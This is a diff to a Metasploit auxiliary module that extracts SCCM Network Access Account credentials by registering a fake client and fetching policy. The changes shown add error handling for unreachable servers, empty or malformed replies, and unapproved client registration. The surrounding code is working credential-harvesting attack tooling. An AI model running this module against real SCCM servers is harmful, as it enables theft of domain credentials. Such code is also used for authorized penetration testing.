@@ -157,6 +157,8 @@ class MetasploitModule < Msf::Auxiliary
     results.each do |username, password|
       print_good("Found valid NAA creds: #{username}:#{password}")
     end
+  rescue SocketError => e
+    fail_with(Failure::Unreachable, e.message)
   end
 
   def request_policy(http_opts, policy_url, sms_id, key)
@@ -320,14 +322,31 @@ class MetasploitModule < Msf::Auxiliary
     opts['headers'] = opts['headers'].merge({
       'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
     })
-    response = send_request_cgi(opts)
-    response = Rex::MIME::Message.new(response.to_s)
+    http_response = send_request_cgi(opts)
+    if http_response.nil?
+      fail_with(Failure::Unreachable, 'No response from server')
+    end
+    response = Rex::MIME::Message.new(http_response.to_s)
+    if response.parts.length == 0
+      html_doc = Nokogiri::HTML(http_response.to_s)
+      error = html_doc.xpath('//title').text
+      if error.blank?
+        error = 'Bad response from server'
+        dlog('Response from server:')
+        dlog(http_response.to_s)
+      end
+      fail_with(Failure::UnexpectedReply, error)
+    end
 
     response.parts[0].content.force_encoding('utf-16le').encode('utf-8').delete_prefix("\uFEFF")
     compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
     xml_doc = Nokogiri::XML(compressed_response.encode('utf-8')) # It's crazy, but XML parsing doesn't work with UTF-16-encoded strings
     sms_id = xml_doc.root&.attributes&.[]('SMSID')&.value&.delete_prefix('GUID:')
     if sms_id.nil?
+      approval = xml_doc.root&.attributes&.[]('ApprovalStatus')&.value
+      if approval == "-1"
+        fail_with(Failure::UnexpectedReply, 'Client registration not approved by SCCM server')
+      end
       fail_with(Failure::UnexpectedReply, 'Did not retrieve SMS ID')
     end
     print_status("Got SMS ID: #{sms_id}")
